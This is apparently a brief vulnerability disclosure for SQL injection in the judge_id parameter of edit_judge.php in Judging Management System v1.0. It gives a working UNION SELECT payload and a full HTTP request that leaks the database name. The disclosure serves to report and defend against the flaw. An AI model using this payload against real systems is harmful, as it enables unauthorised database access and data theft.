# Judging Management System v1.0 by oretnom23 has SQL injection

BUG_Author: whoamikey

vendors: https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /php-jms/edit_judge.php?sub_event_id=&se_name=&judge_id=

Vulnerability location: /php-jms/edit_judge.php?sub_event_id=&se_name=&judge_id=, judge_id

dbname =jms_db

[+] Payload: /php-jms/edit_judge.php?sub_event_id=&se_name=&judge_id=-1%27%20union%20select%201,2,database(),4,5,6--+ // Leak place ---> judge_id

```sql
GET /php-jms/edit_judge.php?sub_event_id=&se_name=&judge_id=-1%27%20union%20select%201,2,database(),4,5,6--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=f6bhcgo222sk31fnm99nf9tjt1
Connection: closes
```

![image](https://user-images.githubusercontent.com/54017627/206374422-bbf606a2-08c7-46c6-8e2b-80babb1c35e2.png)
